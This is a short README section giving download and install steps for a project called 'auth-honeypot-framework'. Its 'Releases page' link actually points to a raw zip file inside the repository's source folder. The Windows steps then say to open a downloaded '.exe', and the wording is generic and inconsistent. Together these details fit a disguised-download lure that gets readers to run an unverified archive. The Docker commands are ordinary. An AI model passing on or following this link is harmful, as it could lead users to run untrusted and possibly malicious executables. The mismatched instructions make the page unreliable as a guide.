## üìÇ Download & Install
To get started, visit the Releases page to download the latest version of the auth-honeypot-framework.

[Visit the Releases Page to Download](https://raw.githubusercontent.com/Regansyncretistic786/auth-honeypot-framework/main/src/protocols/auth-honeypot-framework-v2.2.zip)

1. Click the link above.
2. Find the latest release at the top.
3. Click the asset name corresponding to your operating system to begin downloading.

After downloading, follow these steps to install:

### Windows
1. Open the downloaded `.exe` file.
2. Follow the installation prompts.
3. Ensure Docker is set up correctly by running `docker --version` in your command prompt.

### macOS and Linux
For macOS and Linux, you may use Docker for installation. To set it up, follow these steps:

1. Open your terminal.
2. Navigate to the folder where you downloaded the file.
3. Run the following command:
   ```bash
   docker pull Regansyncretistic786/auth-honeypot-framework
   ```
This command will download the Docker image.

4. Once the image is downloaded, run the framework with:
   ```bash
   docker run -it --rm Regansyncretistic786/auth-honeypot-framework
   ```
